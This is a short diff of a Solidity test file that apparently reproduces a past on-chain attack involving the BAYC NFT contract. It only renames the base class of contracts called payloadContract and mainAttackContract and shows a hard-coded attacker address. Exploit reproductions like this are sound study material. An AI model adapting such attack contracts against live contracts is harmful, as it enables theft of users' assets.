@@ -59,7 +59,7 @@ interface INothing {
 }
 
 /* Contract: 0x2d6e070af9574d07ef17ccd5748590a86690d175 */
-contract payloadContract is DSTest {
+contract payloadContract is Test {
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     uint256 orderId = 0;
@@ -106,7 +106,7 @@ contract payloadContract is DSTest {
 }
 
 /* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */
-contract mainAttackContract is DSTest {
+contract mainAttackContract is Test {
     address payable[33] public payloads;
     address attacker = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a;
     IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
